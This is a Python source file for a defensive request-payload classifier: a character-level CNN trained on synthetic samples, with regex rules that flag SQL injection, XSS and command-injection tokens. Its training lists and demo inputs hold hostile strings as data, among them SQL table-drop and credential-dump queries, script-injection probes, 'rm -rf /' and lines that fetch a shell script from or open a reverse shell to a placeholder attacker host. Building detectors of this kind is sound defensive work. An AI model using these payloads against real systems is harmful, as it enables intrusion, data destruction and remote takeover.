"""
AGENT 2: PAYLOAD ANALYSIS AGENT
Model: Character-level CNN
Analyzes: raw payload content — scans for SQLi, XSS, command-injection signatures
Output: {attack_type: str, confidence: 0-1, suspicious_tokens: [...]}
"""

import numpy as np
import random
import re
import tensorflow as tf
from tensorflow.keras import layers, models

# ---------------------------------------------------------------------------
# 1. CHARACTER VOCAB + ENCODING
# ---------------------------------------------------------------------------
VOCAB = list(" abcdefghijklmnopqrstuvwxyz0123456789"
             "!@#$%^&*()_+-=[]{}|;:'\",.<>/?\\`~")
CHAR_TO_IDX = {c: i + 1 for i, c in enumerate(VOCAB)}  # 0 = padding/unknown
MAX_LEN = 200
NUM_CLASSES = 4  # 0=benign, 1=sqli, 2=xss, 3=cmd_injection
CLASS_NAMES = ["benign", "sql_injection", "xss", "command_injection"]


def encode_payload(text: str, max_len: int = MAX_LEN) -> np.ndarray:
    text = text.lower()[:max_len]
    ids = [CHAR_TO_IDX.get(c, 0) for c in text]
    ids += [0] * (max_len - len(ids))
    return np.array(ids, dtype=np.int32)


# ---------------------------------------------------------------------------
# 2. SYNTHETIC DATA (swap for real payload logs / OWASP payload lists when available)
# ---------------------------------------------------------------------------
SQLI_PATTERNS = [
    "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT username,password FROM users--",
    "admin'--", "1' AND 1=1--", "' OR 'a'='a", "1' ORDER BY 10--",
]
XSS_PATTERNS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "javascript:alert(document.cookie)",
    "<body onload=alert('xss')>",
]
CMD_PATTERNS = [
    "; cat /etc/passwd", "| ls -la", "&& rm -rf /", "`whoami`",
    "$(curl attacker.com/shell.sh)", "; nc -e /bin/sh attacker.com 4444",
]
BENIGN_PATTERNS = [
    "john.doe@example.com", "quantity=3&color=blue", '{"name":"laptop","price":999}',
    "search query for running shoes", "user comment: great product, fast shipping",
    "address=123 Main St, Springfield",
]


def _noisy(patterns, n):
    out = []
    for _ in range(n):
        p = random.choice(patterns)
        # embed pattern inside a realistic-looking request context sometimes
        if random.random() < 0.5:
            p = f"field={p}"
        out.append(p)
    return out


def build_dataset(n_per_class=500):
    texts, labels = [], []
    for cls_idx, patterns in enumerate([BENIGN_PATTERNS, SQLI_PATTERNS, XSS_PATTERNS, CMD_PATTERNS]):
        for t in _noisy(patterns, n_per_class):
            texts.append(t)
            labels.append(cls_idx)
    X = np.array([encode_payload(t) for t in texts])
    y = np.array(labels)
    # shuffle
    idx = np.arange(len(X))
    np.random.shuffle(idx)
    return X[idx], y[idx]


# ---------------------------------------------------------------------------
# 3. MODEL
# ---------------------------------------------------------------------------
def build_model(vocab_size=len(VOCAB) + 1, max_len=MAX_LEN, num_classes=NUM_CLASSES):
    inputs = layers.Input(shape=(max_len,), dtype="int32")
    x = layers.Embedding(vocab_size, 32, input_length=max_len)(inputs)
    x = layers.Conv1D(64, 5, activation="relu", padding="same")(x)
    x = layers.MaxPooling1D(2)(x)
    x = layers.Conv1D(128, 5, activation="relu", padding="same")(x)
    x = layers.GlobalMaxPooling1D()(x)
    x = layers.Dense(64, activation="relu")(x)
    x = layers.Dropout(0.3)(x)
    outputs = layers.Dense(num_classes, activation="softmax")(x)

    model = models.Model(inputs, outputs)
    model.compile(optimizer="adam", loss="sparse_categorical_crossentropy", metrics=["accuracy"])
    return model


# ---------------------------------------------------------------------------
# 4. SUSPICIOUS TOKEN HIGHLIGHTING (rule-based, complements the CNN's classification)
# ---------------------------------------------------------------------------
TOKEN_PATTERNS = {
    "sql_injection": [r"union\s+select", r"or\s+1\s*=\s*1", r"drop\s+table", r"--", r"'\s*or\s*'"],
    "xss": [r"<script.*?>", r"onerror\s*=", r"onload\s*=", r"javascript:"],
    "command_injection": [r";\s*\w+", r"\|\s*\w+", r"&&", r"`.*?`", r"\$\(.*?\)"],
}


def find_suspicious_tokens(text: str, attack_type: str) -> list:
    if attack_type not in TOKEN_PATTERNS:
        return []
    found = []
    for pattern in TOKEN_PATTERNS[attack_type]:
        for m in re.finditer(pattern, text, re.IGNORECASE):
            found.append(m.group())
    return list(set(found))[:5]


# ---------------------------------------------------------------------------
# 5. AGENT
# ---------------------------------------------------------------------------
class PayloadAgent:
    def __init__(self):
        self.model = build_model()
        self.is_fitted = False

    def train(self, X, y, epochs=8, batch_size=32, validation_split=0.15):
        history = self.model.fit(
            X, y, epochs=epochs, batch_size=batch_size,
            validation_split=validation_split, verbose=2,
        )
        self.is_fitted = True
        return history

    def predict(self, request: dict) -> dict:
        if not self.is_fitted:
            raise RuntimeError("Call train() first.")
        text = (request.get("path", "") or "") + " " + (request.get("body", "") or "")
        vec = encode_payload(text).reshape(1, -1)
        probs = self.model.predict(vec, verbose=0)[0]
        pred_idx = int(np.argmax(probs))
        attack_type = CLASS_NAMES[pred_idx]
        confidence = float(probs[pred_idx])

        tokens = find_suspicious_tokens(text, attack_type) if attack_type != "benign" else []

        return {
            "agent": "payload",
            "attack_type": attack_type,
            "confidence": round(confidence, 4),
            "suspicious_tokens": tokens,
            "class_probabilities": {CLASS_NAMES[i]: round(float(p), 4) for i, p in enumerate(probs)},
        }

    def save(self, path="payload_agent.keras"):
        self.model.save(path)

    def load(self, path="payload_agent.keras"):
        self.model = tf.keras.models.load_model(path)
        self.is_fitted = True


# ---------------------------------------------------------------------------
# 6. DEMO
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    X, y = build_dataset(n_per_class=400)
    split = int(len(X) * 0.85)
    X_train, y_train = X[:split], y[:split]
    X_test, y_test = X[split:], y[split:]

    agent = PayloadAgent()
    agent.train(X_train, y_train, epochs=8)

    loss, acc = agent.model.evaluate(X_test, y_test, verbose=0)
    print(f"\nHeld-out test accuracy: {acc:.2%} (synthetic data — inflated vs. real traffic)")

    agent.save()

    print("\n=== Benign request ===")
    print(agent.predict({"path": "/api/cart", "body": "quantity=2&color=red"}))

    print("\n=== SQLi request ===")
    print(agent.predict({"path": "/api/users?id=1' OR '1'='1", "body": ""}))

    print("\n=== XSS request ===")
    print(agent.predict({"path": "/api/comment", "body": "<script>alert(document.cookie)</script>"}))

    print("\n=== Command injection request ===")
    print(agent.predict({"path": "/api/ping", "body": "host=127.0.0.1; cat /etc/passwd"}))
